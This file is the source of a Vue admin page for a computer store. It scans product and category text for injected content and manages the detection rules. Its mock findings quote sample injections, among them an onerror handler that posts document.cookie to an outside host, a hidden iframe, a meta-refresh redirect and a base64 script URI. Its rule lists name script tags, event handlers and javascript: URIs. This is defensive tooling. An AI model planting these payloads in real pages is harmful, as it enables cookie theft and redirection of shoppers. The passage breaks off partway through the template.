<!-- File: /pages/admin/content-security/index.vue -->
<script setup lang="ts">
import { ref, computed, watch } from 'vue';
import { 
  Shield, 
  ShieldAlert, 
  ShieldCheck, 
  AlertTriangle, 
  AlertOctagon, 
  CheckCircle2, 
  Search, 
  Play, 
  RefreshCw, 
  Filter, 
  Layers, 
  Package, 
  ExternalLink, 
  Eye, 
  Edit3, 
  Check, 
  X, 
  Plus, 
  Trash2, 
  Code2, 
  Globe2, 
  FileText, 
  SlidersHorizontal, 
  ArrowRight, 
  Info,
  Clock,
  Sparkles,
  ChevronRight,
  MoreVertical,
  RotateCcw
} from 'lucide-vue-next';
import { cn } from '@/utils';
import { toastSuccess, toastInfo, toastWarning, toastError } from '@/composables/useToast';
import UiTable, { type UiTableColumn } from '@/components/ui/UiTable.vue';
import UiPagination from '@/components/ui/UiPagination.vue';
import UiAdminModal from '@/components/ui/UiAdminModal.vue';
import UiBadge from '@/components/ui/UiBadge.vue';
import UiButton from '@/components/ui/Button.vue';
import { refDebounced } from '@vueuse/core';

definePageMeta({
  layout: 'admin'
});

useSeoMeta({
  title: 'Content Security - Best Computer Hub Admin',
  robots: 'noindex, nofollow'
});

// ==========================================
// Types
// ==========================================
export type SecurityStatus = 'Clean' | 'Needs Review' | 'High Risk' | 'Critical' | 'Resolved';
export type SecuritySeverity = 'Low' | 'Medium' | 'High' | 'Critical';
export type ContentType = 'Product' | 'Category';
export type DetectorType = 'Keyword' | 'Domain' | 'HTML' | 'Attribute' | 'Redirect' | 'Hidden Content' | 'Obfuscation';

export interface SecurityFinding {
  id: string;
  contentType: ContentType;
  contentId: string | number;
  contentName: string;
  contentSlug: string;
  categoryName?: string;
  field: string;
  riskScore: number;
  status: SecurityStatus;
  severity: SecuritySeverity;
  detector: DetectorType;
  ruleName: string;
  description: string;
  matchedValue: string;
  contextSnippetBefore: string;
  contextSnippetMatched: string;
  contextSnippetAfter: string;
  lineOffset: number;
  scannedAt: string;
  storefrontUrl: string;
  adminEditUrl: string;
}

export interface DetectionRule {
  id: string;
  type: 'keyword' | 'domain' | 'html' | 'attribute' | 'redirect';
  pattern: string;
  category: string;
  severity: SecuritySeverity;
  description: string;
  enabled: boolean;
  matchCount: number;
  updatedAt: string;
}

// ==========================================
// State Management
// ==========================================
const mainTab = ref<'overview' | 'results' | 'rules'>('overview');
const rulesSubTab = ref<'keywords' | 'domains' | 'html' | 'attributes' | 'redirects'>('keywords');

// Scan State
const isScanning = ref(false);
const scanProgress = ref(0);
const scanStepText = ref('');
const lastScanTimestamp = ref('14 minutes ago');
const totalEntitiesScanned = ref(4306);

// Findings Mock Data
const findings = ref<SecurityFinding[]>([
  {
    id: 'SEC-1092',
    contentType: 'Product',
    contentId: '101',
    contentName: 'ASUS ROG Strix GeForce RTX 4090 OC Edition 24GB',
    contentSlug: 'asus-rog-strix-geforce-rtx-4090-oc-edition-24gb',
    categoryName: 'Graphics Cards',
    field: 'description',
    riskScore: 98,
    status: 'Critical',
    severity: 'Critical',
    detector: 'Domain',
    ruleName: 'Blacklisted Promo Host',
    description: 'Blacklisted affiliate casino and promo redirect domain found embedded in description hyperlink.',
    matchedValue: 'https://casino-example.com/bonus-claim?ref=9982',
    contextSnippetBefore: '...equipped with axial-tech fan technology and a patented vapor chamber. For official claims, rebates and rewards visit ',
    contextSnippetMatched: 'https://casino-example.com/bonus-claim?ref=9982',
    contextSnippetAfter: ' to register your warranty and redeem exclusive cashback immediately...',
    lineOffset: 42,
    scannedAt: '2026-08-25 11:52 UTC',
    storefrontUrl: '/product/asus-rog-strix-geforce-rtx-4090-oc-edition-24gb/',
    adminEditUrl: '/admin/products?modal=edit&id=101'
  },
  {
    id: 'SEC-1088',
    contentType: 'Product',
    contentId: '104',
    contentName: 'MSI Katana 15 B13V 15.6" 144Hz Gaming Laptop',
    contentSlug: 'msi-katana-15-b13v-gaming-laptop',
    categoryName: 'Gaming Laptops',
    field: 'specifications',
    riskScore: 92,
    status: 'Critical',
    severity: 'Critical',
    detector: 'HTML',
    ruleName: 'Disallowed iframe Injection',
    description: 'Dangerous inline <iframe> tag with cross-origin external tracking source detected in specification table.',
    matchedValue: '<iframe src="https://tracker-telemetry.biz/embed.html" width="0" height="0"></iframe>',
    contextSnippetBefore: '...Display: 15.6" FHD 144Hz IPS-Level Display. ',
    contextSnippetMatched: '<iframe src="https://tracker-telemetry.biz/embed.html" width="0" height="0"></iframe>',
    contextSnippetAfter: ' Operating System: Windows 11 Home Advanced Edition...',
    lineOffset: 18,
    scannedAt: '2026-08-25 11:48 UTC',
    storefrontUrl: '/product/msi-katana-15-b13v-gaming-laptop/',
    adminEditUrl: '/admin/products?modal=edit&id=104'
  },
  {
    id: 'SEC-1074',
    contentType: 'Product',
    contentId: '109',
    contentName: 'Corsair Vengeance RGB DDR5 32GB (2x16GB) 6000MHz CL36',
    contentSlug: 'corsair-vengeance-rgb-ddr5-32gb-6000mhz',
    categoryName: 'Memory / RAM',
    field: 'description',
    riskScore: 84,
    status: 'High Risk',
    severity: 'High',
    detector: 'Attribute',
    ruleName: 'Dangerous Inline onerror Handler',
    description: 'Inline JavaScript event attribute `onerror` detected inside custom HTML image element.',
    matchedValue: 'onerror="fetch(\'https://telemetry-log.net/p\', {method:\'POST\',body:document.cookie})"',
    contextSnippetBefore: '...features dynamic ten-zone RGB lighting. <img src="cor-vengeance.png" ',
    contextSnippetMatched: 'onerror="fetch(\'https://telemetry-log.net/p\', {method:\'POST\',body:document.cookie})"',
    contextSnippetAfter: ' class="w-full h-auto" /> Designed for high-frequency overclocking...',
    lineOffset: 27,
    scannedAt: '2026-08-25 11:40 UTC',
    storefrontUrl: '/product/corsair-vengeance-rgb-ddr5-32gb-6000mhz/',
    adminEditUrl: '/admin/products?modal=edit&id=109'
  },
  {
    id: 'SEC-1065',
    contentType: 'Category',
    contentId: '18',
    contentName: 'High Performance Gaming Laptops',
    contentSlug: 'gaming-laptops',
    categoryName: 'Laptops',
    field: 'category_description',
    riskScore: 78,
    status: 'High Risk',
    severity: 'High',
    detector: 'Redirect',
    ruleName: 'External Meta Refresh Redirect',
    description: 'Meta refresh tag detected directing traffic away to unapproved third-party landing page.',
    matchedValue: '<meta http-equiv="refresh" content="3;url=https://free-giveaway-zone.xyz">',
    contextSnippetBefore: '...Explore the premier collection of portable computing rigs. ',
    contextSnippetMatched: '<meta http-equiv="refresh" content="3;url=https://free-giveaway-zone.xyz">',
    contextSnippetAfter: ' Top-rated brands including ASUS, MSI, Razer, and Lenovo...',
    lineOffset: 5,
    scannedAt: '2026-08-25 11:34 UTC',
    storefrontUrl: '/product-category/gaming-laptops/',
    adminEditUrl: '/admin/categories?modal=edit&id=18'
  },
  {
    id: 'SEC-1052',
    contentType: 'Product',
    contentId: '115',
    contentName: 'Samsung 990 PRO 2TB PCIe 4.0 NVMe M.2 SSD',
    contentSlug: 'samsung-990-pro-2tb-pcie-4-nvme-m2-ssd',
    categoryName: 'Storage / SSD',
    field: 'short_description',
    riskScore: 71,
    status: 'High Risk',
    severity: 'High',
    detector: 'Domain',
    ruleName: 'Unverified External File Host',
    description: 'Link pointing to known unverified file downloading portal in short description.',
    matchedValue: 'https://free-file-vault-dl.com/driver-installer.exe',
    contextSnippetBefore: '...Sequential read speeds up to 7,450 MB/s. Official driver package: ',
    contextSnippetMatched: 'https://free-file-vault-dl.com/driver-installer.exe',
    contextSnippetAfter: ' for Windows 10 and 11 installation...',
    lineOffset: 12,
    scannedAt: '2026-08-25 11:22 UTC',
    storefrontUrl: '/product/samsung-990-pro-2tb-pcie-4-nvme-m2-ssd/',
    adminEditUrl: '/admin/products?modal=edit&id=115'
  },
  {
    id: 'SEC-1044',
    contentType: 'Product',
    contentId: '122',
    contentName: 'Logitech G Pro X Superlight 2 Wireless Gaming Mouse',
    contentSlug: 'logitech-g-pro-x-superlight-2',
    categoryName: 'Peripherals / Mice',
    field: 'description',
    riskScore: 58,
    status: 'Needs Review',
    severity: 'Medium',
    detector: 'Keyword',
    ruleName: 'Blacklisted Keyword match: "free crypto giveaway"',
    description: 'Suspicious spam keyword combination detected in customer review snippet or seller note.',
    matchedValue: 'free crypto giveaway',
    contextSnippetBefore: '...Featuring HERO 2 Sensor with 32,000 DPI. Enter our seasonal ',
    contextSnippetMatched: 'free crypto giveaway',
    contextSnippetAfter: ' by adding this product to your public wishlist today...',
    lineOffset: 34,
    scannedAt: '2026-08-25 11:15 UTC',
    storefrontUrl: '/product/logitech-g-pro-x-superlight-2/',
    adminEditUrl: '/admin/products?modal=edit&id=122'
  },
  {
    id: 'SEC-1039',
    contentType: 'Category',
    contentId: '24',
    contentName: 'Mechanical Keyboards & Switches',
    contentSlug: 'keyboards-switches',
    categoryName: 'Peripherals',
    field: 'category_description',
    riskScore: 52,
    status: 'Needs Review',
    severity: 'Medium',
    detector: 'Hidden Content',
    ruleName: 'Invisible Font Zero-Size Div',
    description: 'Hidden zero-pixel div element containing keyword stuffing detected.',
    matchedValue: '<div style="font-size:0px;color:transparent;display:none;">cheap laptops free keys</div>',
    contextSnippetBefore: '...Custom hot-swappable mechanical keyboards and enthusiast switches. ',
    contextSnippetMatched: '<div style="font-size:0px;color:transparent;display:none;">cheap laptops free keys</div>',
    contextSnippetAfter: ' Browse tactile, linear, and clicky switches...',
    lineOffset: 9,
    scannedAt: '2026-08-25 11:02 UTC',
    storefrontUrl: '/product-category/keyboards-switches/',
    adminEditUrl: '/admin/categories?modal=edit&id=24'
  },
  {
    id: 'SEC-1025',
    contentType: 'Product',
    contentId: '130',
    contentName: 'NZXT Kraken Elite 360 RGB Liquid CPU Cooler with LCD Display',
    contentSlug: 'nzxt-kraken-elite-360-rgb',
    categoryName: 'Cooling / AIO',
    field: 'description',
    riskScore: 46,
    status: 'Needs Review',
    severity: 'Medium',
    detector: 'Obfuscation',
    ruleName: 'Base64 Encoded JS Data URI',
    description: 'Obfuscated Base64 data URI string detected inside hyperlink tag.',
    matchedValue: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    contextSnippetBefore: '...Equipped with custom pump and high-res LCD screen. Sample gif: <a href="',
    contextSnippetMatched: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    contextSnippetAfter: '">Click for animation preview</a>...',
    lineOffset: 55,
    scannedAt: '2026-08-25 10:45 UTC',
    storefrontUrl: '/product/nzxt-kraken-elite-360-rgb/',
    adminEditUrl: '/admin/products?modal=edit&id=130'
  },
  {
    id: 'SEC-1018',
    contentType: 'Product',
    contentId: '142',
    contentName: 'Seasonic Focus GX-850 850W 80+ Gold Full Modular PSU',
    contentSlug: 'seasonic-focus-gx-850-psu',
    categoryName: 'Power Supplies',
    field: 'specifications',
    riskScore: 28,
    status: 'Needs Review',
    severity: 'Low',
    detector: 'Keyword',
    ruleName: 'Suspicious External Contact Token',
    description: 'Direct Telegram/WhatsApp handle found in specification field bypassing official support channel.',
    matchedValue: 't.me/direct_tech_support_bot',
    contextSnippetBefore: '...Warranty: 10 Years Manufacturer Warranty. For immediate claims contact: ',
    contextSnippetMatched: 't.me/direct_tech_support_bot',
    contextSnippetAfter: ' or visit Seasonic global portal...',
    lineOffset: 14,
    scannedAt: '2026-08-25 10:30 UTC',
    storefrontUrl: '/product/seasonic-focus-gx-850-psu/',
    adminEditUrl: '/admin/products?modal=edit&id=142'
  },
  {
    id: 'SEC-1010',
    contentType: 'Product',
    contentId: '150',
    contentName: 'Lian Li O11 Dynamic EVO Mid-Tower Case - Black',
    contentSlug: 'lian-li-o11-dynamic-evo',
    categoryName: 'PC Cases',
    field: 'description',
    riskScore: 0,
    status: 'Clean',
    severity: 'Low',
    detector: 'HTML',
    ruleName: 'Standard Clean Inspection',
    description: 'All HTML tags sanitized and compliant with Storefront standards.',
    matchedValue: 'None',
    contextSnippetBefore: '...Dual chamber chassis with flexible configuration. ',
    contextSnippetMatched: 'Compliant HTML',
    contextSnippetAfter: ' Supports up to 3x 360mm radiators...',
    lineOffset: 1,
    scannedAt: '2026-08-25 10:15 UTC',
    storefrontUrl: '/product/lian-li-o11-dynamic-evo/',
    adminEditUrl: '/admin/products?modal=edit&id=150'
  },
  {
    id: 'SEC-1004',
    contentType: 'Product',
    contentId: '155',
    contentName: 'AMD Ryzen 7 7800X3D 8-Core 16-Thread Desktop Processor',
    contentSlug: 'amd-ryzen-7-7800x3d',
    categoryName: 'Processors / CPU',
    field: 'description',
    riskScore: 0,
    status: 'Resolved',
    severity: 'Low',
    detector: 'Domain',
    ruleName: 'Prior Flag Resolved',
    description: 'Previously flagged unverified link corrected by staff administrator.',
    matchedValue: 'None (Resolved)',
    contextSnippetBefore: '...Built with 3D V-Cache technology for ultimate gaming performance. ',
    contextSnippetMatched: 'Sanitized Content',
    contextSnippetAfter: ' Compatible with AM5 socket motherboards...',
    lineOffset: 8,
    scannedAt: '2026-08-25 09:40 UTC',
    storefrontUrl: '/product/amd-ryzen-7-7800x3d/',
    adminEditUrl: '/admin/products?modal=edit&id=155'
  }
]);

// ==========================================
// Detection Rules Mock Data
// ==========================================
const rules = ref<DetectionRule[]>([
  // Keywords
  { id: 'R-KW-01', type: 'keyword', pattern: 'free crypto giveaway', category: 'Spam & Scam', severity: 'High', description: 'Detects crypto phishing and fraudulent giveaway phrases in product bodies', enabled: true, matchCount: 14, updatedAt: '2026-08-20' },
  { id: 'R-KW-02', type: 'keyword', pattern: 'whatsapp +', category: 'Off-Platform Contacts', severity: 'Medium', description: 'Blocks direct off-platform messaging solicitation numbers', enabled: true, matchCount: 8, updatedAt: '2026-08-18' },
  { id: 'R-KW-03', type: 'keyword', pattern: 'telegram @', category: 'Off-Platform Contacts', severity: 'Medium', description: 'Blocks unauthorized Telegram support contact strings', enabled: true, matchCount: 19, updatedAt: '2026-08-15' },
  { id: 'R-KW-04', type: 'keyword', pattern: 'viagra|cialis|casino bonus', category: 'Spam Blacklist', severity: 'Critical', description: 'Strict pharma and gambling spam keyword blacklist', enabled: true, matchCount: 42, updatedAt: '2026-08-10' },
  
  // Domains
  { id: 'R-DM-01', type: 'domain', pattern: 'casino-example.com', category: 'Gambling Blacklist', severity: 'Critical', description: 'Blacklisted affiliate casino redirect portal', enabled: true, matchCount: 3, updatedAt: '2026-08-22' },
  { id: 'R-DM-02', type: 'domain', pattern: 'free-giveaway-zone.xyz', category: 'Phishing Host', severity: 'Critical', description: 'Known phishing lure hosting fake reward claim forms', enabled: true, matchCount: 6, updatedAt: '2026-08-21' },
  { id: 'R-DM-03', type: 'domain', pattern: 'tracker-telemetry.biz', category: 'Tracking & Adware', severity: 'High', description: 'Unapproved third-party tracking pixel script host', enabled: true, matchCount: 1, updatedAt: '2026-08-19' },
  { id: 'R-DM-04', type: 'domain', pattern: 'free-file-vault-dl.com', category: 'Malicious Downloads', severity: 'Critical', description: 'Suspicious executable payload distribution domain', enabled: true, matchCount: 2, updatedAt: '2026-08-12' },

  // HTML
  { id: 'R-HT-01', type: 'html', pattern: '<script>', category: 'Dangerous Tags', severity: 'Critical', description: 'Strict ban on raw inline or external script tags in rich text', enabled: true, matchCount: 11, updatedAt: '2026-08-24' },
  { id: 'R-HT-02', type: 'html', pattern: '<iframe>', category: 'Embedded Content', severity: 'Critical', description: 'Disallows embedded third party frames and overlays', enabled: true, matchCount: 4, updatedAt: '2026-08-24' },
  { id: 'R-HT-03', type: 'html', pattern: '<object>', category: 'Plugin Objects', severity: 'Critical', description: 'Blocks legacy ActiveX and object execution containers', enabled: true, matchCount: 0, updatedAt: '2026-08-10' },
  { id: 'R-HT-04', type: 'html', pattern: '<embed>', category: 'Plugin Objects', severity: 'Critical', description: 'Disallows binary payload embedding tags', enabled: true, matchCount: 0, updatedAt: '2026-08-10' },
  { id: 'R-HT-05', type: 'html', pattern: '<base>', category: 'DOM Hijacking', severity: 'Critical', description: 'Prevents base URL redirection hijacking in rich descriptions', enabled: true, matchCount: 1, updatedAt: '2026-08-05' },

  // Attributes
  { id: 'R-AT-01', type: 'attribute', pattern: 'onerror', category: 'Event Handlers', severity: 'Critical', description: 'Blocks inline image / media error event handler execution', enabled: true, matchCount: 5, updatedAt: '2026-08-23' },
  { id: 'R-AT-02', type: 'attribute', pattern: 'onclick', category: 'Event Handlers', severity: 'Critical', description: 'Disallows raw click event attributes in customer content', enabled: true, matchCount: 9, updatedAt: '2026-08-23' },
  { id: 'R-AT-03', type: 'attribute', pattern: 'onload', category: 'Event Handlers', severity: 'Critical', description: 'Blocks body and element load event injection triggers', enabled: true, matchCount: 2, updatedAt: '2026-08-20' },
  { id: 'R-AT-04', type: 'attribute', pattern: 'javascript:', category: 'URI Scheme', severity: 'Critical', description: 'Blocks pseudo-protocol javascript execution in href attributes', enabled: true, matchCount: 7, updatedAt: '2026-08-15' },
  { id: 'R-AT-05', type: 'attribute', pattern: 'formaction', category: 'Form Redirection', severity: 'High', description: 'Blocks formaction override on input and button tags', enabled: true, matchCount: 0, updatedAt: '2026-08-08' },

  // Redirects
  { id: 'R-RD-01', type: 'redirect', pattern: 'http-equiv="refresh"', category: 'Meta Navigation', severity: 'Critical', description: 'Disallows automated client-side meta refresh triggers', enabled: true, matchCount: 2, updatedAt: '2026-08-22' },
  { id: 'R-RD-02', type: 'redirect', pattern: 'window.location', category: 'DOM Redirection', severity: 'Critical', description: 'Detects JavaScript navigation hijacking attempts', enabled: true, matchCount: 1, updatedAt: '2026-08-18' },
  { id: 'R-RD-03', type: 'redirect', pattern: 'bit.ly/|tinyurl.com/', category: 'URL Shorteners', severity: 'Medium', description: 'Flags obfuscated shortener URLs that hide actual destinations', enabled: true, matchCount: 18, updatedAt: '2026-08-14' }
]);

// ==========================================
// Filter State for Scan Results
// ==========================================
const searchQuery = ref('');
const debouncedSearch = refDebounced(searchQuery, 300);
const filterContentType = ref('all');
const filterStatus = ref('all');
const filterSeverity = ref('all');
const filterDetector = ref('all');
const filterCategory = ref('all');

// Pagination
const currentPage = ref(1);
const itemsPerPage = ref(10);

const uniqueCategories = computed(() => {
  const cats = new Set<string>();
  findings.value.forEach(f => {
    if (f.categoryName) cats.add(f.categoryName);
  });
  return Array.from(cats);
});

const filteredFindings = computed(() => {
  return findings.value.filter(item => {
    // Search
    if (debouncedSearch.value.trim()) {
      const q = debouncedSearch.value.toLowerCase().trim();
      const match = 
        item.contentName.toLowerCase().includes(q) ||
        item.description.toLowerCase().includes(q) ||
        item.matchedValue.toLowerCase().includes(q) ||
        item.field.toLowerCase().includes(q) ||
        item.id.toLowerCase().includes(q);
      if (!match) return false;
    }

    // Content Type
    if (filterContentType.value !== 'all' && item.contentType !== filterContentType.value) {
      return false;
    }

    // Status
    if (filterStatus.value !== 'all' && item.status !== filterStatus.value) {
      return false;
    }

    // Severity
    if (filterSeverity.value !== 'all' && item.severity !== filterSeverity.value) {
      return false;
    }

    // Detector
    if (filterDetector.value !== 'all' && item.detector !== filterDetector.value) {
      return false;
    }

    // Category
    if (filterCategory.value !== 'all' && item.categoryName !== filterCategory.value) {
      return false;
    }

    return true;
  });
});

const totalPages = computed(() => {
  return Math.ceil(filteredFindings.value.length / itemsPerPage.value) || 1;
});

const paginatedFindings = computed(() => {
  const start = (currentPage.value - 1) * itemsPerPage.value;
  return filteredFindings.value.slice(start, start + itemsPerPage.value);
});

watch([debouncedSearch, filterContentType, filterStatus, filterSeverity, filterDetector, filterCategory, itemsPerPage], () => {
  currentPage.value = 1;
});

const resetFilters = () => {
  searchQuery.value = '';
  filterContentType.value = 'all';
  filterStatus.value = 'all';
  filterSeverity.value = 'all';
  filterDetector.value = 'all';
  filterCategory.value = 'all';
  toastInfo('Filters have been reset.');
};

// Summary metrics computed
const summaryMetrics = computed(() => {
  const total = totalEntitiesScanned.value;
  const critical = findings.value.filter(f => f.status === 'Critical').length;
  const high = findings.value.filter(f => f.status === 'High Risk').length;
  const needsReview = findings.value.filter(f => f.status === 'Needs Review').length;
  const clean = total - (critical + high + needsReview);
  const cleanPercent = ((clean / total) * 100).toFixed(1);

  return {
    total,
    clean,
    cleanPercent,
    needsReview,
    high,
    critical
  };
});

// Recent findings for Overview
const recentFindings = computed(() => {
  return findings.value.slice(0, 5);
});

// ==========================================
// Modal State: Finding Details
// ==========================================
const isDetailModalOpen = ref(false);
const selectedFinding = ref<SecurityFinding | null>(null);

const openFindingDetail = (finding: SecurityFinding) => {
  selectedFinding.value = finding;
  isDetailModalOpen.value = true;
};

const closeFindingDetail = () => {
  isDetailModalOpen.value = false;
  selectedFinding.value = null;
};

// Actions inside Finding Details Modal
const markFindingAsSafe = (finding: SecurityFinding) => {
  finding.status = 'Clean';
  finding.riskScore = 0;
  toastSuccess(`Finding ${finding.id} marked as safe and whitelisted.`);
  closeFindingDetail();
};

const confirmFindingSuspicious = (finding: SecurityFinding) => {
  finding.status = 'High Risk';
  toastWarning(`Finding ${finding.id} confirmed as verified security risk.`);
};

const resolveFinding = (finding: SecurityFinding) => {
  finding.status = 'Resolved';
  finding.riskScore = 0;
  toastSuccess(`Finding ${finding.id} marked as resolved.`);
  closeFindingDetail();
};

const isRescanningItem = ref(false);
const rescanFinding = (finding: SecurityFinding) => {
  isRescanningItem.value = true;
  setTimeout(() => {
    isRescanningItem.value = false;
    toastSuccess(`Rescan completed for ${finding.contentName}. Current content is verified.`);
  }, 1200);
};

// ==========================================
// Mock Scan Action
// ==========================================
const runFullScan = () => {
  if (isScanning.value) return;
  isScanning.value = true;
  scanProgress.value = 0;
  scanStepText.value = 'Initializing payload parser and rule registry...';

  const steps = [
    { progress: 15, text: 'Scanning 4,120 Product titles, descriptions & specification matrices...' },
    { progress: 45, text: 'Inspecting 186 Category tree descriptions and marketing blocks...' },
    { progress: 70, text: 'Running Domain Blacklist & Cross-Site Scripting heuristics...' },
    { progress: 90, text: 'Checking HTML tag structures and event attributes...' },
    { progress: 100, text: 'Scan complete. Compiling threat analysis report...' }
  ];

  let stepIdx = 0;
  const interval = setInterval(() => {
    if (stepIdx < steps.length) {
      const step = steps[stepIdx];
      if (step) {
        scanProgress.value = step.progress;
        scanStepText.value = step.text;
      }
      stepIdx++;
    } else {
      clearInterval(interval);
      setTimeout(() => {
        isScanning.value = false;
        lastScanTimestamp.value = 'Just now';
        toastSuccess('Catalog Security Scan completed. All 4,306 entities inspected.');
      }, 500);
    }
  }, 600);
};

// ==========================================
// Modal State: Add / Edit Rule
// ==========================================
const isRuleModalOpen = ref(false);
const editingRule = ref<DetectionRule | null>(null);
const ruleForm = ref({
  type: 'keyword' as DetectionRule['type'],
  pattern: '',
  category: 'General',
  severity: 'High' as SecuritySeverity,
  description: '',
  enabled: true
});

const openAddRuleModal = (type: DetectionRule['type']) => {
  editingRule.value = null;
  ruleForm.value = {
    type,
    pattern: '',
    category: type === 'keyword' ? 'Spam Blacklist' : type === 'domain' ? 'Malicious Domains' : type === 'html' ? 'Disallowed Tags' : type === 'attribute' ? 'Event Handlers' : 'Redirects',
    severity: 'High',
    description: '',
    enabled: true
  };
  isRuleModalOpen.value = true;
};

const openEditRuleModal = (rule: DetectionRule) => {
  editingRule.value = rule;
  ruleForm.value = {
    type: rule.type,
    pattern: rule.pattern,
    category: rule.category,
    severity: rule.severity,
    description: rule.description,
    enabled: rule.enabled
  };
  isRuleModalOpen.value = true;
};

const saveRule = () => {
  if (!ruleForm.value.pattern.trim()) {
    toastError('Please enter a valid rule pattern.');
    return;
  }

  if (editingRule.value) {
    editingRule.value.pattern = ruleForm.value.pattern.trim();
    editingRule.value.category = ruleForm.value.category.trim();
    editingRule.value.severity = ruleForm.value.severity;
    editingRule.value.description = ruleForm.value.description.trim();
    editingRule.value.enabled = ruleForm.value.enabled;
    editingRule.value.updatedAt = new Date().toISOString().split('T')[0] || '2026-08-25';
    toastSuccess(`Rule ${editingRule.value.id} updated successfully.`);
  } else {
    const newId = `R-${ruleForm.value.type.substring(0, 2).toUpperCase()}-${Math.floor(10 + Math.random() * 90)}`;
    rules.value.unshift({
      id: newId,
      type: ruleForm.value.type,
      pattern: ruleForm.value.pattern.trim(),
      category: ruleForm.value.category.trim(),
      severity: ruleForm.value.severity,
      description: ruleForm.value.description.trim() || 'Custom administrator detection rule',
      enabled: ruleForm.value.enabled,
      matchCount: 0,
      updatedAt: new Date().toISOString().split('T')[0] || '2026-08-25'
    });
    toastSuccess(`New detection rule ${newId} created successfully.`);
  }

  isRuleModalOpen.value = false;
};

const toggleRuleStatus = (rule: DetectionRule) => {
  rule.enabled = !rule.enabled;
  if (rule.enabled) {
    toastSuccess(`Rule ${rule.id} has been enabled.`);
  } else {
    toastInfo(`Rule ${rule.id} has been disabled.`);
  }
};

const deleteRule = (rule: DetectionRule) => {
  rules.value = rules.value.filter(r => r.id !== rule.id);
  toastSuccess(`Rule ${rule.id} (${rule.pattern}) has been deleted.`);
};

// Filtered rules for current sub-tab
const filteredRules = computed(() => {
  const typeMap: Record<string, DetectionRule['type']> = {
    keywords: 'keyword',
    domains: 'domain',
    html: 'html',
    attributes: 'attribute',
    redirects: 'redirect'
  };
  const targetType = typeMap[rulesSubTab.value];
  return rules.value.filter(r => r.type === targetType);
});

// Table columns for Scan Results
const scanResultColumns: UiTableColumn<SecurityFinding>[] = [
  { key: 'status', label: 'Status', width: '130px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'contentType', label: 'Type', width: '110px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'contentName', label: 'Content Entity', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 max-w-[280px]' },
  { key: 'field', label: 'Field', width: '120px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap font-mono text-xs' },
  { key: 'riskScore', label: 'Risk Score', width: '120px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'findings', label: 'Detected Issue', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 max-w-[320px]' },
  { key: 'scannedAt', label: 'Scanned At', width: '140px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap text-xs text-muted-foreground' },
  { key: 'actions', label: 'Actions', align: 'right', width: '100px', headerClass: 'px-4 py-3 text-right whitespace-nowrap', cellClass: 'px-4 py-3 text-right whitespace-nowrap' }
];

// Helper styles for badges
const getStatusBadge = (status: SecurityStatus) => {
  switch (status) {
    case 'Critical': return { variant: 'error' as const, label: 'Critical', icon: AlertOctagon };
    case 'High Risk': return { variant: 'error' as const, label: 'High Risk', icon: AlertTriangle };
    case 'Needs Review': return { variant: 'warning' as const, label: 'Needs Review', icon: Info };
    case 'Clean': return { variant: 'success' as const, label: 'Clean', icon: CheckCircle2 };
    case 'Resolved': return { variant: 'info' as const, label: 'Resolved', icon: Check };
    default: return { variant: 'secondary' as const, label: status, icon: Info };
  }
};

const getSeverityBadge = (severity: SecuritySeverity) => {
  switch (severity) {
    case 'Critical': return 'bg-rose-500/10 text-rose-600 dark:text-rose-400 border-rose-500/30';
    case 'High': return 'bg-amber-500/10 text-amber-600 dark:text-amber-400 border-amber-500/30';
    case 'Medium': return 'bg-blue-500/10 text-blue-600 dark:text-blue-400 border-blue-500/30';
    case 'Low': return 'bg-slate-500/10 text-slate-600 dark:text-slate-400 border-slate-500/30';
  }
};
</script>

<template>
  <div class="space-y-6 animate-in fade-in duration-500 pb-12">
    <!-- Header Row -->
    <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-border pb-5">
      <div class="space-y-1">
        <div class="flex items-center gap-2">
          <div class="w-8 h-8 rounded-xl bg-primary/10 border border-primary/20 flex items-center justify-center text-primary shadow-xs">
            <Shield class="w-4 h-4" />
          </div>
          <h1 class="text-2xl sm:text-3xl font-display font-extrabold tracking-tight text-foreground">
            Content Security
          </h1>
          <span class="ml-2 px-2.5 py-0.5 rounded-full text-[10px] font-bold uppercase tracking-wider bg-primary/10 text-primary border border-primary/20">
            Active Guard
          </span>
        </div>
        <p class="text-xs sm:text-sm text-muted-foreground">
          Automated threat detection, payload inspection, and content integrity enforcement across products and categories.
        </p>
      </div>

      <!-- Header Actions -->
      <div class="flex items-center gap-3 shrink-0">
        <div class="text-right hidden md:block">
          <p class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Last Scanned</p>
          <p class="text-xs font-semibold text-foreground flex items-center gap-1">
            <Clock class="w-3 h-3 text-muted-foreground" />
            {{ lastScanTimestamp }}
          </p>
        </div>

        <UiButton 
          @click="runFullScan" 
          :disabled="isScanning"
          class="h-10 px-5 gap-2 font-bold text-xs shadow-md shadow-primary/20 whitespace-nowrap"
        >
          <Play v-if="!isScanning" class="w-3.5 h-3.5 fill-current" />
          <RefreshCw v-else class="w-3.5 h-3.5 animate-spin" />
          <span>{{ isScanning ? 'Scanning Catalog...' : 'Run Scan' }}</span>
        </UiButton>
      </div>
    </div>

    <!-- Active Scan Banner (Shows when scan is running) -->
    <div 
      v-if="isScanning" 
      class="bg-card border border-primary/30 rounded-2xl p-4 sm:p-5 shadow-lg relative overflow-hidden animate-in fade-in duration-300"
    >
      <div class="absolute -right-12 -top-12 w-40 h-40 bg-primary/10 rounded-full blur-2xl"></div>
      <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 mb-3 relative z-10">
        <div class="flex items-center gap-3">
          <div class="w-9 h-9 rounded-xl bg-primary text-primary-foreground flex items-center justify-center shrink-0 shadow-sm animate-pulse">
            <ShieldCheck class="w-5 h-5" />
          </div>
          <div>
            <h3 class="text-sm font-bold text-foreground">Executing Full Security Inspection</h3>
